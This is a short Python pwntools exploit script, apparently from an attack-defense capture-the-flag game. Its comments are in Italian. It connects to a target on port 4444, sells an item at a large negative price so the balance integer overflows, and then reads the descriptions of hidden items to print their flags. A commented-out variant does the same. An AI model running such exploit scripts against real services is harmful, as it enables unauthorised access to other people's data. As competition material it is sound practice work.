#!/bin/python
from pwn import *
import time
import sys

def generate_random_string():
    length = random.randint(5, 15)
    letters = string.ascii_letters + string.digits + string.punctuation
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string.encode('utf-8')


r = remote(sys.argv[1], 4444)
noteName = generate_random_string()

r.sendline(generate_random_string())
r.sendline(b"1")
time.sleep(0.2)
r.sendline(b"2")
r.sendline(noteName)
r.sendline(b"-214783649")
r.sendline(generate_random_string())
r.sendline(b"EOF")
r.sendline(b"n")
r.sendline(b"3")
r.sendline(noteName)
r.sendline(b"n")
# Aspetta fino a che non leggi Your current balance is 2147483649 e salva tutto in una variabile
price_lines = []

r.sendline(b"1")

# Loop per ricevere tutte le righe che contengono "PRICE"
for x in range(200):
    try:
        line = r.recvline_contains(b"PRICE", timeout=0.1)
        price_lines.append(line)
    except EOFError:
        break

# Stampa tutte le righe contenenti "PRICE"
last = "c"
valid = []
for i in price_lines:
    if i != b'':
        i.decode("utf-8")
        try:
            #print(int(i.split(b" ")[-1]) > 0)
            #print(i)
            if int(i.split(b" ")[-1]) > 0:
                #last = i
                valid.append(i)
                #print(i)
            #print(i)
        except Exception as e:
            pass
for flag in valid:
    try:
        noteflag = flag.split(b" ")[0]
        #print(noteflag)
        r.sendline(b"3")
        r.sendline(noteflag)
        r.sendline(b"n")
        line = r.recvline_contains(b"Book description:", timeout=0.5)
        print(str(line.split(b":")[-1].strip()), flush=True)
    except EOFError:
        break


"""
toParse = r.recvuntil(b"Your current balance:").decode("utf-8")
titles = []
flags = []
for line in toParse.splitlines():
    if "PRICE" in line:
        titles.append(line.split(" ")[0])

#sell book
r.sendline(b"1")
r.sendline(b"2")

r.sendline(noteName)
r.sendline(b"-21474836")
r.sendline(generate_random_string())
r.sendline(b"EOF")
r.sendline(b"n")

r.sendline(b"3")
r.sendline(noteName)
r.sendline(b"n")

r.sendline(b"3")
for title in titles:
    if title == "":
        continue
    r.sendline(title.encode('utf-8'))
    r.sendline(b"n")
    flag = r.recvall(1).decode("utf-8")
    for line in flag.splitlines():
        if "Book description" in line:
            flags.append(line.split(" ")[1])
"""
